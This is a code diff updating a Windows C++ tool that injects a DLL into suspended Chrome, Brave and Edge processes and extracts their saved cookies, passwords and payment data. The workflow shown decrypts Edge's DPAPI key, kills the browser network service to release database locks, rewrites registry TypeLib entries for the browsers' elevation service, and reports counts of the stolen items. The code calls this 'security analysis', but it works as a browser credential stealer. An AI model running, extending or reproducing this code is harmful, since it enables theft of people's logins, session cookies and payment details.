@@ -6,25 +6,63 @@
 #include "CommunicationLayer.h"
 #include "BannerSystem.h"
 #include "BrowserHelp.h"
+#include "RuntimeSupport.h"
 #include "syscalls.h"
-#include <iostream> 
-#include <algorithm>
-#include <map>
-#include <sstream>
+#include <shellapi.h>
+#include <cstdint>
+#include <utility>
+#include <vector>
 
 namespace
 {
-    constexpr const char* APP_VERSION = "1.0.1";
+    constexpr const char* APP_VERSION = "1.0.5";
     constexpr const char* SECURITY_MODULE_NAME = "kvc_crypt.dll";
-}
 
-std::string g_securityModulePath;
+    std::vector<int> ParseVersionName(std::wstring_view name)
+    {
+        std::vector<int> parts;
+        std::uint64_t value = 0;
+        bool hasDigit = false;
+
+        for (std::size_t i = 0; i <= name.size(); ++i)
+        {
+            if (i == name.size() || name[i] == L'.')
+            {
+                if (!hasDigit || value > 2147483647ULL)
+                    return {};
+                parts.push_back(static_cast<int>(value));
+                value = 0;
+                hasDigit = false;
+                continue;
+            }
+            if (name[i] < L'0' || name[i] > L'9')
+                return {};
+            hasDigit = true;
+            value = value * 10 + static_cast<unsigned>(name[i] - L'0');
+        }
+        return parts.size() == 4 ? parts : std::vector<int>{};
+    }
+
+    bool IsNewerVersion(const std::vector<int>& candidate, const std::vector<int>& current)
+    {
+        if (current.empty())
+            return true;
+        if (candidate.size() != current.size())
+            return candidate.size() > current.size();
+        for (std::size_t i = 0; i < candidate.size(); ++i)
+        {
+            if (candidate[i] != current[i])
+                return candidate[i] > current[i];
+        }
+        return false;
+    }
+}
 
 // Parses command-line arguments into configuration structure
 std::optional<Configuration> Configuration::CreateFromArgs(int argc, wchar_t* argv[], const Console& console)
 {
     Configuration config;
-    fs::path customOutputPath;
+    std::wstring customOutputPath;
 
     for (int i = 1; i < argc; ++i)
     {
@@ -53,23 +91,28 @@ std::optional<Configuration> Configuration::CreateFromArgs(int argc, wchar_t* ar
         return std::nullopt;
     }
 
-    std::transform(config.browserType.begin(), config.browserType.end(), 
-                  config.browserType.begin(), ::towlower);
+    kvc::text::LowerWideInPlace(config.browserType);
 
-    static const std::map<std::wstring, std::wstring> browserExeMap = {
-        {L"chrome", L"chrome.exe"},
-        {L"brave", L"brave.exe"},
-        {L"edge", L"msedge.exe"}
-    };
-
-    auto it = browserExeMap.find(config.browserType);
-    if (it == browserExeMap.end())
+    if (config.browserType == L"chrome")
+    {
+        config.browserProcessName = L"chrome.exe";
+        config.browserDisplayName = "Chrome";
+    }
+    else if (config.browserType == L"brave")
+    {
+        config.browserProcessName = L"brave.exe";
+        config.browserDisplayName = "Brave";
+    }
+    else if (config.browserType == L"edge")
+    {
+        config.browserProcessName = L"msedge.exe";
+        config.browserDisplayName = "Edge";
+    }
+    else
     {
         console.Error("Unsupported browser type: " + Utils::WStringToUtf8(config.browserType));
         return std::nullopt;
     }
-
-    config.browserProcessName = it->second;
 
     BrowserPathResolver resolver(console);
     config.browserDefaultExePath = resolver.resolve(config.browserProcessName);
@@ -83,9 +126,9 @@ std::optional<Configuration> Configuration::CreateFromArgs(int argc, wchar_t* ar
         return std::nullopt;
     }
 
-    config.browserDisplayName = Utils::Capitalize(Utils::WStringToUtf8(config.browserType));
-    config.outputPath = customOutputPath.empty() ? fs::current_path() / "output" : 
-                       fs::absolute(customOutputPath);
+    config.outputPath = customOutputPath.empty()
+                            ? kvc::paths::Join(kvc::paths::CurrentDirectory(), L"output")
+                            : kvc::paths::Absolute(customOutputPath);
 
     return config;
 }
@@ -97,54 +140,41 @@ void FixChromeTypeLibPaths(const std::wstring& browserExePath, const Console& co
 {
     // Chrome installs to Application\chrome.exe but stores versioned binaries under
     // Application\<version>\elevation_service.exe. We must scan for the version directory.
-    fs::path appDir = fs::path(browserExePath).parent_path();
-
-    fs::path elevSvc;
+    const std::wstring appDir = kvc::paths::Parent(browserExePath);
+    std::wstring elevationService;
 
     // Case 1: already in versioned dir (e.g. Application\146.0.7680.165\chrome.exe)
-    fs::path candidate = appDir / L"elevation_service.exe";
-    if (fs::exists(candidate))
-        elevSvc = candidate;
+    const std::wstring directCandidate = kvc::paths::Join(appDir, L"elevation_service.exe");
+    if (kvc::paths::FileExists(directCandidate))
+        elevationService = directCandidate;
 
     // Case 2: appDir is Application\, version dirs are subdirectories
-    if (elevSvc.empty())
+    if (elevationService.empty())
     {
         std::vector<int> bestVersion;
-        std::error_code ec;
-        for (const auto& entry : fs::directory_iterator(appDir, ec))
+        for (const std::wstring& directory : kvc::paths::EnumerateDirectories(appDir))
         {
-            if (!entry.is_directory(ec))
+            const std::vector<int> parts = ParseVersionName(kvc::paths::FileName(directory));
+            if (parts.empty())
                 continue;
 
-            std::wstring dirName = entry.path().filename().wstring();
-            std::vector<int> parts;
-            std::wistringstream ss(dirName);
-            std::wstring token;
-            bool valid = true;
-            while (std::getline(ss, token, L'.'))
-            {
-                try { parts.push_back(std::stoi(token)); }
-                catch (...) { valid = false; break; }
-            }
-            if (!valid || parts.size() != 4)
+            const std::wstring svcCandidate =
+                kvc::paths::Join(directory, L"elevation_service.exe");
+            if (!kvc::paths::FileExists(svcCandidate))
                 continue;
 
-            fs::path svcCandidate = entry.path() / L"elevation_service.exe";
-            if (!fs::exists(svcCandidate, ec))
-                continue;
-
-            if (bestVersion.empty() || parts > bestVersion)
+            if (IsNewerVersion(parts, bestVersion))
             {
                 bestVersion = parts;
-                elevSvc = svcCandidate;
+                elevationService = svcCandidate;
             }
         }
     }
 
-    if (elevSvc.empty())
+    if (elevationService.empty())
         return;
 
-    std::wstring newPath = elevSvc.wstring();
+    const std::wstring& newPath = elevationService;
 
     const wchar_t* const typeLibGuids[] = {
         L"{463ABECF-410D-407F-8AF5-0DF35A005CC8}",  // IElevatorChrome
@@ -152,6 +182,14 @@ void FixChromeTypeLibPaths(const std::wstring& browserExePath, const Console& co
         L"{A2721D66-376E-4D2F-9F0F-9070E9A42B5F}",  // IElevatorChromeBeta
         L"{BB2AA26B-343A-4072-8B6F-80557B8CE571}",  // IElevatorChromeDev
         L"{4F7CE041-28E9-484F-9DD0-61A8CACEFEE4}",  // IElevatorChromeCanary
+        L"{1BF5208B-295F-4992-B5F4-3A9BB6494838}",  // IElevator2Chrome
+        L"{BB19A0E5-00C6-4966-94B2-5AFEC6FED93A}",  // IElevator2Chromium
+        L"{B96A14B8-D0B0-44D8-BA68-2385B2A03254}",  // IElevator2ChromeBeta
+        L"{3FEFA48E-C8BF-461F-AED6-63F658CC850A}",  // IElevator2ChromeDev
+        L"{FF672E9F-0994-4322-81E5-3A5A9746140A}",  // IElevator2ChromeCanary
+        L"{12B23868-6DCD-4D1A-AD4C-65B0285201FC}",  // IElevator3Edge
+        L"{C9C2B807-7731-4F34-81B7-44FF7779522B}",  // IElevatorEdge
+        L"{05EB264E-4D60-4F34-ADB7-1F983E930A79}",  // IElevator2Edge
     };
 
     for (const auto* guid : typeLibGuids)
@@ -167,13 +205,24 @@ void FixChromeTypeLibPaths(const std::wstring& browserExePath, const Console& co
             DWORD sz = sizeof(curVal);
             DWORD type = 0;
             if (RegQueryValueExW(hKey, nullptr, nullptr, &type, reinterpret_cast<LPBYTE>(curVal), &sz) == ERROR_SUCCESS
-                && type == REG_SZ && !fs::exists(curVal))
+                && type == REG_SZ && !kvc::paths::Exists(curVal))
             {
-                RegSetValueExW(hKey, nullptr, 0, REG_SZ,
+                LSTATUS setStatus = RegSetValueExW(hKey, nullptr, 0, REG_SZ,
                     reinterpret_cast<const BYTE*>(newPath.c_str()),
                     static_cast<DWORD>((newPath.size() + 1) * sizeof(wchar_t)));
-                console.Debug("Fixed stale TypeLib path for " + Utils::WStringToUtf8(guid) +
-                    " [" + Utils::WStringToUtf8(arch) + "]");
+                if (setStatus == ERROR_SUCCESS)
+                {
+                    console.Debug("Fixed stale TypeLib path for " + Utils::WStringToUtf8(guid) +
+                        " [" + Utils::WStringToUtf8(arch) + "]");
+                }
+                else
+                {
+                    std::string message = "Failed to update TypeLib path for " +
+                                          Utils::WStringToUtf8(guid) + " [" +
+                                          Utils::WStringToUtf8(arch) + "], error: ";
+                    kvc::text::AppendSigned(message, setStatus);
+                    console.Warn(message);
+                }
             }
             RegCloseKey(hKey);
         }
@@ -181,30 +230,36 @@ void FixChromeTypeLibPaths(const std::wstring& browserExePath, const Console& co
 }
 
 // Orchestrates complete injection workflow: cleanup, injection, execution, termination
-PipeCommunicator::ExtractionStats RunInjectionWorkflow(const Configuration& config, const Console& console)
+bool RunInjectionWorkflow(const Configuration& config, const Console& console,
+                          std::wstring_view securityModulePath,
+                          PipeCommunicator::ExtractionStats& stats)
 {
     std::vector<uint8_t> edgeDpapiKey;
     
     // Edge-specific: Extract DPAPI key in orchestrator before process creation
     if (config.browserType == L"edge")
     {
-        // Try multiple possible Edge installation paths
-        std::vector<fs::path> possiblePaths = {
-            Utils::GetLocalAppDataPath() / "Microsoft" / "Edge" / "User Data" / "Local State",
-            Utils::GetLocalAppDataPath() / "Microsoft" / "Edge Beta" / "User Data" / "Local State", 
-            Utils::GetLocalAppDataPath() / "Microsoft" / "Edge Dev" / "User Data" / "Local State"
+        const std::wstring localAppData = Utils::GetLocalAppDataPath();
+        if (localAppData.empty())
+        {
+            console.Error("Failed to get Local AppData path.");
+            return false;
+        }
+
+        const wchar_t* edgeStates[] = {
+            L"Microsoft\\Edge\\User Data\\Local State",
+            L"Microsoft\\Edge Beta\\User Data\\Local State",
+            L"Microsoft\\Edge Dev\\User Data\\Local State"
         };
         
-        for (const auto& edgeLocalState : possiblePaths) 
+        for (const wchar_t* relativePath : edgeStates)
         {
-            if (fs::exists(edgeLocalState)) 
+            const std::wstring edgeLocalState = kvc::paths::Join(localAppData, relativePath);
+            if (kvc::paths::FileExists(edgeLocalState))
             {
                 edgeDpapiKey = DecryptEdgePasswordKeyWithDPAPI(edgeLocalState, console);
-                
-                if (!edgeDpapiKey.empty()) 
-                {
+                if (!edgeDpapiKey.empty())
                     break;
-                }
             }
         }
         
@@ -214,9 +269,8 @@ PipeCommunicator::ExtractionStats RunInjectionWorkflow(const Configuration& conf
         }
     }
 
-    // For Chrome/Brave: fix stale TypeLib paths that break CoCreateInstance after auto-update
-    if (config.browserType != L"edge")
-        FixChromeTypeLibPaths(config.browserDefaultExePath, console);
+    // Fix stale TypeLib paths that break CoCreateInstance after auto-update
+    FixChromeTypeLibPaths(config.browserDefaultExePath, console);
 
     // Kill network service for all browsers — releases Cookies/LoginData DB locks
     // Keep main browser process alive for all browsers — COM elevation service must stay reachable
@@ -225,36 +279,68 @@ PipeCommunicator::ExtractionStats RunInjectionWorkflow(const Configuration& conf
 
     // Create suspended target process
     TargetProcess target(config, console);
-    target.createSuspended();
+    std::string error;
+    if (!target.createSuspended(error))
+    {
+        console.Error(error);
+        return false;
+    }
 
     // Establish named pipe communication
     PipeCommunicator pipe(Utils::GenerateUniquePipeName(), console);
-    pipe.create();
+    if (!pipe.create(error))
+    {
+        console.Error(error);
+        target.terminate();
+        return false;
+    }
 
     // Inject security module and create remote thread
-    InjectionManager injector(target, console);
-    injector.execute(pipe.getName());
+    InjectionManager injector(target, console, std::wstring(securityModulePath));
+    if (!injector.execute(pipe.getName(), error))
+    {
+        console.Error(error);
+        target.terminate();
+        return false;
+    }
 
     // Wait for module connection and send configuration
-    pipe.waitForClient();
-    pipe.sendInitialData(config.verbose, config.outputPath, edgeDpapiKey);
+    if (!pipe.waitForClient(error) ||
+        !pipe.sendInitialData(config.verbose, config.outputPath, edgeDpapiKey, error))
+    {
+        console.Error(error);
+        target.terminate();
+        return false;
+    }
 
-    // Kill network service again right before DLL starts extraction.
-    // The DLL spends ~500ms on COM key decryption after receiving config,
-    // so this second kill hits just before the Cookies database is opened.
-    // Chrome rarely needs this because it restarts its network service slower than Edge.
-    KillBrowserNetworkService(config, console);
+    // The DLL signals only after key decryption. Release Chromium database handles
+    // at that exact point, then acknowledge immediately so extraction can open them.
+    if (!pipe.waitForDatabaseReady(error))
+    {
+        target.terminate();
+        return false;
+    }
+
+    KillBrowserNetworkService(config, console, false);
+    if (!pipe.acknowledgeDatabaseReady(error))
+    {
+        console.Error(error);
+        target.terminate();
+        return false;
+    }
 
     pipe.relayMessages();
 
     // Cleanup
     target.terminate();
 
-    return pipe.getStats();
+    stats = pipe.getStats();
+    return true;
 }
 
 // Processes all installed browsers sequentially
-void ProcessAllBrowsers(const Console& console, bool verbose, const fs::path& outputPath)
+void ProcessAllBrowsers(const Console& console, bool verbose, std::wstring_view outputPath,
+                        std::wstring_view securityModulePath)
 {
     if (verbose)
         console.Info("Starting multi-browser security analysis...");
@@ -269,7 +355,12 @@ void ProcessAllBrowsers(const Console& console, bool verbose, const fs::path& ou
     }
 
     if (!verbose)
-        console.Info("Processing " + std::to_string(installedBrowsers.size()) + " browser(s):\n");
+    {
+        std::string message = "Processing ";
+        kvc::text::AppendUnsigned(message, installedBrowsers.size());
+        message.append(" browser(s):\n");
+        console.Info(message);
+    }
 
     int successCount = 0;
     int failCount = 0;
@@ -283,30 +374,37 @@ void ProcessAllBrowsers(const Console& console, bool verbose, const fs::path& ou
         config.outputPath = outputPath;
         config.browserType = browserType;
         config.browserDefaultExePath = browserPath;
-        
-        static const std::map<std::wstring, std::pair<std::wstring, std::string>> browserMap = {
-            {L"chrome", {L"chrome.exe", "Chrome"}},
-            {L"edge",   {L"msedge.exe", "Edge"}},
-            {L"brave",  {L"brave.exe",  "Brave"}}
-        };
 
-        auto it = browserMap.find(browserType);
-        if (it != browserMap.end())
+        if (browserType == L"chrome")
         {
-            config.browserProcessName = it->second.first;
-            config.browserDisplayName = it->second.second;
+            config.browserProcessName = L"chrome.exe";
+            config.browserDisplayName = "Chrome";
+        }
+        else if (browserType == L"edge")
+        {
+            config.browserProcessName = L"msedge.exe";
+            config.browserDisplayName = "Edge";
+        }
+        else if (browserType == L"brave")
+        {
+            config.browserProcessName = L"brave.exe";
+            config.browserDisplayName = "Brave";
         }
 
         if (verbose)
         {
-            console.Info("\n[Browser " + std::to_string(i + 1) + "/" + 
-                        std::to_string(installedBrowsers.size()) +
-                        "] Processing " + config.browserDisplayName);
+            std::string message = "\n[Browser ";
+            kvc::text::AppendUnsigned(message, i + 1);
+            message.push_back('/');
+            kvc::text::AppendUnsigned(message, installedBrowsers.size());
+            message.append("] Processing ");
+            message.append(config.browserDisplayName);
+            console.Info(message);
         }
 
-        try
+        PipeCommunicator::ExtractionStats stats;
+        if (RunInjectionWorkflow(config, console, securityModulePath, stats))
         {
-            auto stats = RunInjectionWorkflow(config, console);
             successCount++;
 
             if (verbose)
@@ -318,37 +416,41 @@ void ProcessAllBrowsers(const Console& console, bool verbose, const fs::path& ou
                 DisplayExtractionSummary(config.browserDisplayName, stats, console, false, 
                                         config.outputPath);
                 if (i < installedBrowsers.size() - 1)
-                    std::cout << std::endl;
+                    console.BlankLine();
             }
         }
-        catch (const std::exception& e)
+        else
         {
             failCount++;
 
             if (verbose)
             {
-                console.Error(config.browserDisplayName + " analysis failed: " + std::string(e.what()));
+                console.Error(config.browserDisplayName + " analysis failed");
             }
             else
             {
                 console.Info(config.browserDisplayName);
                 console.Error("Analysis failed");
                 if (i < installedBrowsers.size() - 1)
-                    std::cout << std::endl;
+                    console.BlankLine();
             }
         }
     }
 
-    std::cout << std::endl;
-    console.Info("Completed: " + std::to_string(successCount) + " successful, " + 
-                std::to_string(failCount) + " failed");
+    console.BlankLine();
+    std::string completed = "Completed: ";
+    kvc::text::AppendSigned(completed, successCount);
+    completed.append(" successful, ");
+    kvc::text::AppendSigned(completed, failCount);
+    completed.append(" failed");
+    console.Info(completed);
 }
 
 // Displays formatted extraction summary with statistics
 void DisplayExtractionSummary(const std::string& browserName, 
                               const PipeCommunicator::ExtractionStats& stats,
                               const Console& console, bool singleBrowser, 
-                              const fs::path& outputPath)
+                              std::wstring_view outputPath)
 {
     if (singleBrowser)
     {
@@ -359,7 +461,9 @@ void DisplayExtractionSummary(const std::string& browserName,
         if (!summary.empty())
         {
             console.Success(summary);
-            console.Success("Stored in " + Utils::path_to_api_string(outputPath / browserName));
+            const std::wstring outputDirectory =
+                kvc::paths::Join(outputPath, kvc::text::Utf8ToWide(browserName));
+            console.Success("Stored in " + Utils::path_to_api_string(outputDirectory));
         }
         else
         {
@@ -377,7 +481,9 @@ void DisplayExtractionSummary(const std::string& browserName,
         if (!summary.empty())
         {
             console.Success(summary);
-            console.Success("Stored in " + Utils::path_to_api_string(outputPath / browserName));
+            const std::wstring outputDirectory =
+                kvc::paths::Join(outputPath, kvc::text::Utf8ToWide(browserName));
+            console.Success("Stored in " + Utils::path_to_api_string(outputDirectory));
         }
         else
         {
@@ -389,32 +495,50 @@ void DisplayExtractionSummary(const std::string& browserName,
 // Builds human-readable summary from extraction statistics
 std::string BuildExtractionSummary(const PipeCommunicator::ExtractionStats& stats)
 {
-    std::stringstream summary;
+    std::string summary;
     std::vector<std::string> items;
 
     if (stats.totalCookies > 0)
-        items.push_back(std::to_string(stats.totalCookies) + " cookies");
+    {
+        std::string item;
+        kvc::text::AppendSigned(item, stats.totalCookies);
+        item.append(" cookies");
+        items.push_back(std::move(item));
+    }
     if (stats.totalPasswords > 0)
-        items.push_back(std::to_string(stats.totalPasswords) + " passwords");
+    {
+        std::string item;
+        kvc::text::AppendSigned(item, stats.totalPasswords);
+        item.append(" passwords");
+        items.push_back(std::move(item));
+    }
     if (stats.totalPayments > 0)
-        items.push_back(std::to_string(stats.totalPayments) + " payments");
+    {
+        std::string item;
+        kvc::text::AppendSigned(item, stats.totalPayments);
+        item.append(" payments");
+        items.push_back(std::move(item));
+    }
 
     if (!items.empty())
     {
-        summary << "Extracted ";
+        summary.append("Extracted ");
         for (size_t i = 0; i < items.size(); ++i)
         {
             if (i > 0 && i == items.size() - 1)
-                summary << " and ";
+                summary.append(" and ");
             else if (i > 0)
-                summary << ", ";
-            summary << items[i];
+                summary.append(", ");
+            summary.append(items[i]);
         }
-        summary << " from " << stats.profileCount << " profile" 
-                << (stats.profileCount != 1 ? "s" : "");
+        summary.append(" from ");
+        kvc::text::AppendSigned(summary, stats.profileCount);
+        summary.append(" profile");
+        if (stats.profileCount != 1)
+            summary.push_back('s');
     }
 
-    return summary.str();
+    return summary;
 }
 
 // Application entry point
@@ -422,28 +546,41 @@ int wmain(int argc, wchar_t* argv[])
 {
     bool isVerbose = false;
     std::wstring browserTarget;
-    fs::path outputPath;
+    std::wstring outputPath;
     
-    // Locate security module in current directory or System32
-    auto findSecurityModule = []() -> std::string {
-        if (fs::exists(SECURITY_MODULE_NAME))
-            return SECURITY_MODULE_NAME;
+    // Locate security module next to executable, in current directory or System32
+    auto findSecurityModule = []() -> std::wstring {
+        wchar_t exePath[32768] = {};
+        const DWORD length = GetModuleFileNameW(nullptr, exePath, static_cast<DWORD>(std::size(exePath)));
+        if (length > 0 && length < std::size(exePath))
+        {
+            const std::wstring moduleInExeDir =
+                kvc::paths::Join(kvc::paths::Parent(exePath), kvc::text::Utf8ToWide(SECURITY_MODULE_NAME));
+            if (kvc::paths::FileExists(moduleInExeDir))
+                return moduleInExeDir;
+        }
+
+        const std::wstring localModule = kvc::text::Utf8ToWide(SECURITY_MODULE_NAME);
+        if (kvc::paths::FileExists(localModule))
+            return localModule;
         
-        wchar_t systemDir[MAX_PATH];
-        if (GetSystemDirectoryW(systemDir, MAX_PATH) > 0) {
-            std::string systemPath = Utils::WStringToUtf8(systemDir) + "\\" + SECURITY_MODULE_NAME;
-            if (fs::exists(systemPath))
+        wchar_t systemDir[32768] = {};
+        if (GetSystemDirectoryW(systemDir, static_cast<UINT>(std::size(systemDir))) > 0)
+        {
+            const std::wstring systemPath = kvc::paths::Join(systemDir, localModule);
+            if (kvc::paths::FileExists(systemPath))
                 return systemPath;
         }
         
-        return "";
+        return {};
     };
 
-    g_securityModulePath = findSecurityModule();
-    if (g_securityModulePath.empty())
+    const std::wstring securityModulePath = findSecurityModule();
+    if (securityModulePath.empty())
     {
-        std::wcerr << L"Error: " << SECURITY_MODULE_NAME 
-                   << L" not found in current directory or System32!" << std::endl;
+        kvc::console::WriteWide(L"Error: ");
+        kvc::console::WriteUtf8(SECURITY_MODULE_NAME);
+        kvc::console::WriteWide(L" not found in current directory or System32!\n");
         return 1;
     }
     
@@ -455,11 +592,11 @@ int wmain(int argc, wchar_t* argv[])
             isVerbose = true;
         else if ((arg == L"--output-path" || arg == L"-o") && i + 1 < argc)
             outputPath = argv[++i];
-		if (arg == L"--help" || arg == L"-h")
-		{
-			BrowserHelp::PrintUsage(L"kvc_pass.exe");
-			return 0;
-		}
+        else if (arg == L"--help" || arg == L"-h")
+        {
+            BrowserHelp::PrintUsage(L"kvc_pass.exe");
+            return 0;
+        }
         else if (browserTarget.empty() && !arg.empty() && arg[0] != L'-')
             browserTarget = arg;
     }
@@ -471,7 +608,7 @@ int wmain(int argc, wchar_t* argv[])
     if (!CheckWinSQLite3Available())
     {
         console.Warn("winsqlite3.dll not available - trying fallback to sqlite3.dll");
-        if (!fs::exists("sqlite3.dll"))
+        if (!kvc::paths::FileExists(L"sqlite3.dll"))
         {
             console.Error("Neither winsqlite3.dll nor sqlite3.dll available");
             return 1;
@@ -493,30 +630,21 @@ int wmain(int argc, wchar_t* argv[])
     
     // Ensure output directory exists
     if (outputPath.empty())
-        outputPath = fs::current_path() / "output";
+        outputPath = kvc::paths::Join(kvc::paths::CurrentDirectory(), L"output");
+    else
+        outputPath = kvc::paths::Absolute(outputPath);
 
-    std::error_code ec;
-    if (!fs::exists(outputPath)) {
-        fs::create_directories(outputPath, ec);
-        if (ec) {
-            console.Error("Failed to create output directory: " + 
-                         Utils::path_to_api_string(outputPath) + ". Error: " + ec.message());
-            return 1;
-        }
+    if (!kvc::paths::EnsureDirectory(outputPath))
+    {
+        console.Error("Failed to create output directory: " +
+                      Utils::path_to_api_string(outputPath));
+        return 1;
     }
     
     // Process browser(s)
     if (browserTarget == L"all")
     {
-        try
-        {
-            ProcessAllBrowsers(console, isVerbose, outputPath);
-        }
-        catch (const std::exception& e)
-        {
-            console.Error(e.what());
-            return 1;
-        }
+        ProcessAllBrowsers(console, isVerbose, outputPath, securityModulePath);
     }
     else
     {
@@ -524,27 +652,39 @@ int wmain(int argc, wchar_t* argv[])
         if (!optConfig)
             return 1;
 
-        try
-        {
-            if (!isVerbose)
-                console.Info("Processing " + optConfig->browserDisplayName + "...\n");
+        if (!isVerbose)
+            console.Info("Processing " + optConfig->browserDisplayName + "...\n");
 
-            auto stats = RunInjectionWorkflow(*optConfig, console);
-
-            if (!isVerbose)
-                DisplayExtractionSummary(optConfig->browserDisplayName, stats, console, true, 
-                                        optConfig->outputPath);
-            else
-                console.Success("\nSecurity analysis completed successfully");
-        }
-        catch (const std::runtime_error& e)
+        PipeCommunicator::ExtractionStats stats;
+        if (!RunInjectionWorkflow(*optConfig, console, securityModulePath, stats))
         {
-            console.Error(e.what());
             return 1;
         }
+
+        if (!isVerbose)
+            DisplayExtractionSummary(optConfig->browserDisplayName, stats, console, true,
+                                     optConfig->outputPath);
+        else
+            console.Success("\nSecurity analysis completed successfully");
     }
 
     console.Debug("Security orchestrator finished successfully.");
 	Banner::PrintFooter();
     return 0;
+}
+
+extern "C" int __cdecl __isa_available_init();
+
+extern "C" __declspec(safebuffers) void WINAPI EntryPoint()
+{
+    __isa_available_init();
+
+    int argc = 0;
+    wchar_t** argv = CommandLineToArgvW(GetCommandLineW(), &argc);
+    if (!argv)
+        ExitProcess(1);
+
+    const int result = wmain(argc, argv);
+    LocalFree(argv);
+    ExitProcess(static_cast<UINT>(result));
 }
